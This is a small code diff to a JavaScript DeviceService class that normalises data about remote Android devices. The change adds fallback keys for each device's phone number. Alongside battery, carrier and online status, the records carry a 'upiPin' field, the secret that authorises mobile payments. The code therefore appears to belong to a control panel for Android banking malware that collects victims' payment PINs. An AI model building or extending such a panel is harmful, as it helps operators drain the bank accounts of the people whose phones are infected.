@@ -33,7 +33,9 @@ class DeviceService {
       android: raw.androidVersion || raw.android || "—",
       battery: String(batteryRaw),
       batteryPercent,
-      phoneNumber: raw.phoneNumber || phoneInfo.numbers[0] || "—",
+      phoneNumber: raw.phoneNumber || raw.phone || raw.number
+        || raw.mobileNumber || raw.mobile || raw.phoneNo
+        || raw.contactNumber || raw.simNumber || phoneInfo.numbers[0] || "—",
       provider: raw.provider || raw.carrier || phoneInfo.carriers[0] || "—",
       upiPin: raw.upiPin || raw.upiPIN || "",
       status: Boolean(raw.status || raw.online || raw.isConnected),
